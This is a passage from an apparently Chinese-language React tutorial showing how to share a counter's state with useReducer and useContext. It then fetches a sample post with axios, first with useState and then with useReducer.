&gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterThree</span><br></code></pre></td></tr></table></figure><p>这个例子中使用了多个 useReducer，但共用了一个 reducer function。这有效的避免了合并对象的麻烦（可以对比上一节使用展开运算法合并 state）。也提高了代码的复用性。</p><hr><p>useReducer with useContext</p><p>如果在某些场景想再组件之间分享 state，进行全局的 state 管理时，我们可以使用 useReducer 加 useContext。</p><p>要完成这个需求分为 2 步</p><ol><li>使用 useReducer 在根节点创建一个 counter 方法</li><li>通过 useContext 为子组件提供和消费 context</li></ol><p>在app.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><span class="hljs-keyword">import</span> A <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/22A&#x27;</span><br><span class="hljs-keyword">import</span> B <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/22B&#x27;</span><br><span class="hljs-keyword">import</span> C <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/22C&#x27;</span><br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CountContextType</span> &#123;<br>  <span class="hljs-attr">countState</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">countDispatch</span>: <span class="hljs-function">(<span class="hljs-params">action: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CountContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(&#123;&#125; <span class="hljs-keyword">as</span> <span class="hljs-title class_">CountContextType</span>)<br><br><span class="hljs-keyword">const</span> initialState = <span class="hljs-number">0</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params">state: <span class="hljs-built_in">number</span>, action: <span class="hljs-built_in">string</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CountContext.Provider</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">countState:</span> <span class="hljs-attr">count</span>,</span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">countDispatch:</span> <span class="hljs-attr">dispatch</span>,</span></span><br><span class="hljs-tag"><span class="language-xml">      &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">        Count - &#123;count&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">A</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">B</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">C</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">CountContext.Provider</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>A.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">CountContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> countContext = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CountContext</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      A - &#123;countContext.countState&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> A<br></code></pre></td></tr></table></figure><p>B.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> D <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./22D&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">D</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> B<br></code></pre></td></tr></table></figure><p>C.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> E <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./22E&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">E</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> C<br></code></pre></td></tr></table></figure><p>D.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">CountContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">D</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> countContext = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CountContext</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      D - &#123;countContext.countState&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> D<br></code></pre></td></tr></table></figure><p>E.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> F <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./22F&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">E</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">F</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> E<br></code></pre></td></tr></table></figure><p>F.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">CountContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> countContext = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CountContext</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      F - &#123;countContext.countState&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> countContext.countDispatch(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> F<br></code></pre></td></tr></table></figure><p>我们再一起回顾一下</p><ol><li>在 App.tsx 中，我们使用 useReducer 创建了一个 counter，声明了初始值，创建了 reducer 函数，useReducer 返回了状态 count 和 dispatch 方法。</li><li>为了能让其他组件访问到 count 和 dispatch，我们通过 React.createContext 创建了 CountContext，并用 <code>&lt;CountContext.Provider&gt;</code> 包裹根节点。将 count 和 dispatch 作为 value 传给 Provider。</li><li>在子节点中，我们使用 useContext 获取到 count 和 dispatch 方法，通过调用 dispatch 实现对 count 的改变。</li></ol><hr><p>Fetching Data with useReducer</p><p>如何使用 useReducer 去请求远程数据。</p><p>接下来我们做这样一个小需求：</p><ol><li>页面载入时请求数据</li><li>请求数据中展示 loading 状态</li><li>请求返回后移除 loading 样式，展示请求的数据；若请求失败，也移除 loading 展示错误提示</li></ol><p>useState实现请求</p><p>app.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">DataFetchingOne</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/23DataFetchingOne&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataFetchingOne</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>DataFetchingOne.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> postType &#123;<br>  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span><br>  <span class="hljs-attr">body</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DataFetchingOne</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">const</span> [post, setPost] = <span class="hljs-title function_">useState</span>(&#123;&#125; <span class="hljs-keyword">as</span> postType)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)<br>      <span class="hljs-title function_">setPost</span>(res.<span class="hljs-property">data</span>)<br>      <span class="hljs-title function_">setError</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)<br>      <span class="hljs-title function_">setPost</span>(&#123;&#125; <span class="hljs-keyword">as</span> postType)<br>      <span class="hljs-title function_">setError</span>(<span class="hljs-string">&#x27;something went wrong&#x27;</span>)<br>    &#125;)<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;</span><br><span class="language-xml">        loading</span><br><span class="language-xml">          ? &#x27;Loading...&#x27;</span><br><span class="language-xml">          : post.title</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">      &#123;</span><br><span class="language-xml">        error</span><br><span class="language-xml">          ? error</span><br><span class="language-xml">          : null</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">DataFetchingOne</span><br></code></pre></td></tr></table></figure><p>在这个实现中，我们使用了3个useState去控制 loading, post 和 error，接下来看看如何使用 useReducer 实现。</p><p>useReducer实现请求</p><p>app.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">DataFetchingOne</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/23DataFetchingOne&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataFetchingOne</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>DataFetchingTwo.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useEffect, useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> postType &#123;<br>  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span><br>  <span class="hljs-attr">body</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> stateType = &#123;<br>  <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span><br>  <span class="hljs-attr">error</span>: <span class="hljs-built_in">string</span><br>  post?: postType | &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> actionType = &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span> | <span class="hljs-string">&#x27;FETCH_ERROR&#x27;</span><br>  payload?: postType | &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> initialState = &#123;<br>  <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-attr">post</span>: &#123;&#125;,<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params">state: stateType, action: actionType</span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>:<br>      <span class="hljs-keyword">return</span> 